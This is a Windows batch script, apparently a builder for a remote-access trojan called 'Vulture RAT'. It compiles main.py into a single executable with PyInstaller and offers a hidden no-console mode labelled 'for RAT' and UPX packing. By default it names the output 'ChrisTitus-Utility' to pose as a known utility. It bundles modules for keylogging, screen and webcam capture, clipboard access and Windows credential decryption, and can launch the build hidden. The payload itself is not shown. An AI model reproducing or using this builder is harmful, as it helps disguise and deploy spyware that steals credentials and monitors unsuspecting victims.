@echo off
title VULTURE RAT BUILDER
color 0c
setlocal enabledelayedexpansion

cls
echo ==============================================
echo         VULTURE RAT BUILDER v3.0
echo         Made by Vultures
echo ==============================================
echo.

:: Check if main.py exists
if not exist "main.py" (
    echo [X] ERROR: main.py not found!
    pause
    exit /b 1
)

:: Icon file check
set "ICON_FILE="
if exist "icon.ico" (
    set "ICON_FILE=icon.ico"
    echo [YES] Found icon.ico
) else (
    echo [NO] No icon.ico found
)

:: Ask for custom icon path
echo.
set /p custom_icon="Drag .ico file here (or press ENTER to skip): "
if not "%custom_icon%"=="" (
    set "custom_icon=%custom_icon:"=%"
    if exist "%custom_icon%" (
        set "ICON_FILE=%custom_icon%"
        echo [YES] Using custom icon
    ) else (
        echo [X] Icon file not found
        set "ICON_FILE="
    )
)

:: Ask for output name
echo.
set /p output_name="Output EXE name (default: ChrisTitus-Utility): "
if "%output_name%"=="" set "output_name=ChrisTitus-Utility"

:: Console or hidden
echo.
echo [1] No Console (hidden - for RAT)
echo [2] Console window (visible - debugging)
set /p console_choice="Select (1 or 2): "
if "%console_choice%"=="2" (
    set "console_flag="
    echo Mode: Console visible
) else (
    set "console_flag=--noconsole"
    echo Mode: Hidden
)

:: UPX compression
echo.
echo [1] UPX compression (smaller file)
echo [2] No compression (more stable)
set /p upx_choice="Select (1 or 2): "
if "%upx_choice%"=="1" (
    set "upx_flag=--upx-dir=upx"
    echo Compression: UPX
) else (
    set "upx_flag=--noupx"
    echo Compression: None
)

echo.
echo ==============================================
echo              BUILDING...
echo ==============================================
echo.

:: Install packages quietly
echo [*] Installing dependencies...
pip install --quiet discord.py psutil requests pillow pyautogui pynput pyperclip opencv-python mss cryptography numpy pywin32 pypiwin32 2>nul

:: Clean old builds
echo [*] Cleaning previous builds...
if exist "build" rmdir /s /q build 2>nul
if exist "dist" rmdir /s /q dist 2>nul
if exist "*.spec" del *.spec 2>nul

:: Build the command
set "build_cmd=pyinstaller --onefile %console_flag% --name=%output_name%"

:: Add icon if available
if not "%ICON_FILE%"=="" (
    set "build_cmd=%build_cmd% --icon=%ICON_FILE%"
    echo [*] Icon embedded: %ICON_FILE%
)

:: Add hidden imports
set "build_cmd=%build_cmd% --hidden-import=discord --hidden-import=aiohttp --hidden-import=psutil --hidden-import=PIL --hidden-import=cv2 --hidden-import=pynput --hidden-import=Crypto --hidden-import=win32crypt --hidden-import=sqlite3 --hidden-import=requests --hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=mss --hidden-import=numpy --hidden-import=win32com --hidden-import=win32clipboard"

:: Add UPX flag
set "build_cmd=%build_cmd% %upx_flag%"

:: Exclude bloat
set "build_cmd=%build_cmd% --exclude-module=tkinter --exclude-module=unittest --exclude-module=setuptools --exclude-module=pydoc"

:: Add source
set "build_cmd=%build_cmd% main.py"

:: Execute build
echo [*] Running PyInstaller...
echo.
%build_cmd%

:: Check if build succeeded
if exist "dist\%output_name%.exe" (
    echo.
    echo ==============================================
    echo              BUILD SUCCESSFUL!
    echo ==============================================
    echo.
    echo [YES] Executable: dist\%output_name%.exe
    
    :: Get file size
    for %%A in ("dist\%output_name%.exe") do (
        set /a "size_mb=%%~zA/1048576"
        set /a "size_kb=(%%~zA %% 1048576)/1024"
        echo [INFO] File size: !size_mb! MB !size_kb! KB
    )
    
    echo.
    set /p run_now="Run it now? (y/n): "
    if /i "!run_now!"=="y" (
        start /B "" "dist\!output_name!.exe"
        echo [YES] Launched hidden
    )
    
) else (
    echo.
    echo ==============================================
    echo               BUILD FAILED!
    echo ==============================================
    echo.
    echo [X] Build failed. Try:
    echo     1. Run as Administrator
    echo     2. pip install --upgrade pyinstaller
    echo     3. Check main.py for syntax errors
    echo     4. Make sure all imports exist
)

echo.
pause